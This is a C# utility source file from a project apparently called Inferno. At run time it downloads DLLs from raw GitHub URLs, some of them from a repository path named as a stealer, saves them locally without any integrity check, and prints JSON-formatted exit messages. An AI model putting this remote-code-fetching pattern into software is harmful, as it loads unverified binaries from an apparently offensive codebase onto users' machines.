/*
 * 
 * Error exit codes:
 * 0 All is okay.
 * 1 File not found.
 * 2 Admin rights need.
 * 3 Other error.
 * 
*/

using System;
using System.IO;

namespace Inferno
{
    internal class core
    {


        // Load dll
        public static void LoadRemoteLibrary(string url)
        {
            if (!File.Exists(Path.GetFileName(url)))
            {
                try
                {
                    System.Net.WebClient client = new System.Net.WebClient();
                    client.DownloadFile(url, Path.GetFileName(url));
                }
                catch (System.Net.WebException)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.Write("{\"error\":true,\"message\":\"Failed load libraries, not connected to internet!\"}");
                    Environment.Exit(3);
                }
            }
        }

        // Load all dll's
        public static void LoadAllRemoteLibraries()
        {
            string[] dll_urls = new string[]
            {
                "https://raw.githubusercontent.com/LimerBoy/Inferno/master/Inferno/packages/Newtonsoft.Json.12.0.3/lib/net45/Newtonsoft.Json.dll",
                "https://raw.githubusercontent.com/LimerBoy/Adamantium-Thief/master/Stealer/Stealer/modules/Sodium.dll",
                "https://raw.githubusercontent.com/LimerBoy/Adamantium-Thief/master/Stealer/Stealer/modules/libs/libsodium.dll",
                "https://raw.githubusercontent.com/LimerBoy/Adamantium-Thief/master/Stealer/Stealer/modules/libs/libsodium-64.dll",
                "https://raw.githubusercontent.com/LimerBoy/Inferno/master/Inferno/packages/AudioSwitcher.AudioApi.3.0.0/lib/net40/AudioSwitcher.AudioApi.dll",
                "https://raw.githubusercontent.com/LimerBoy/Inferno/master/Inferno/packages/AudioSwitcher.AudioApi.CoreAudio.3.0.0.1/lib/net40/AudioSwitcher.AudioApi.CoreAudio.dll",
                "https://raw.githubusercontent.com/LimerBoy/Inferno/master/Inferno/packages/SSH.NET.2016.1.0/lib/net40/Renci.SshNet.dll"
            };
            foreach(string dll in dll_urls)
            {
                LoadRemoteLibrary(dll);
            }
        }

        // Exit
        public static void Exit(string message, dynamic output, int exitcode = 0)
        {
            try
            {
                _ = output.error;
                Console.ForegroundColor = ConsoleColor.Red;
            } catch (Microsoft.CSharp.RuntimeBinder.RuntimeBinderException)
            {
                Console.ForegroundColor = ConsoleColor.Cyan;
                output.error = false;
            }

            output.message = message;
            string json = Newtonsoft.Json.JsonConvert.SerializeObject(output);
            Console.Write(json);
            Console.ForegroundColor = ConsoleColor.White;
            Environment.Exit(exitcode);
        }
    }
}